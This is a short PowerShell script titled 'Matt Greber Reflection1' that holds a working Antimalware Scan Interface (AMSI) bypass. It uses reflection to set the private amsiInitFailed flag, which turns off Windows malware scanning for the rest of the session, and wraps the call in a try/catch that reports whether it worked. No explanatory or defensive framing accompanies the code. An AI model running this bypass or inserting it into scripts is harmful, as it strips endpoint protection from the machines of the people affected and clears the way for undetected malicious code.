# Matt Greber Reflection1
try {
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    Write-Host "Script executed successfully"
} catch {
    Write-Host "Script execution failed: $($_.Exception.Message)"
}

